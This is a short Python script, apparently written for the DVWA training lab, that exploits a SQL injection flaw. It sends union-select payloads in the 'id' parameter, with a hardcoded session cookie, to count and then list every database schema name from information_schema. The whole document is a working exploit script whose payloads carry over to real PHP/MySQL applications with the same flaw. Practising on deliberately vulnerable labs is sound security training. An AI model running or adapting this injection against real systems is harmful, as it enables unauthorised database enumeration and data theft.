#!/usr/bin/python3

import requests, re, sys

cookies = {
    "security" : "low",
    "PHPSESSID" : "bhkjdcaq61erh35rkppiu01pv3"
}

ip = sys.argv[1]

r = requests.get(f"http://{ip}/dvwa/vulnerabilities/sqli/?id=%27+union+select+count%28*%29%2CNULL+fROM+information_schema.schemata%23&Submit=Submit#", cookies=cookies)

print("[+] BASE DE DATOS")

num_DB = re.findall(r"/>First name: (.*?)<br", r.text)

for i in range(0,int(num_DB[0])):
    r = requests.get(f"http://{ip}/dvwa/vulnerabilities/sqli/?id=%27+union+select+schema_name%2CNULL+from+information_schema.schemata+LIMIT+{i}%2C1%23&Submit=Submit#", cookies=cookies)

    name_DB = re.findall(r"/>First name: (.*?)<br", r.text)
    print(name_DB[0])
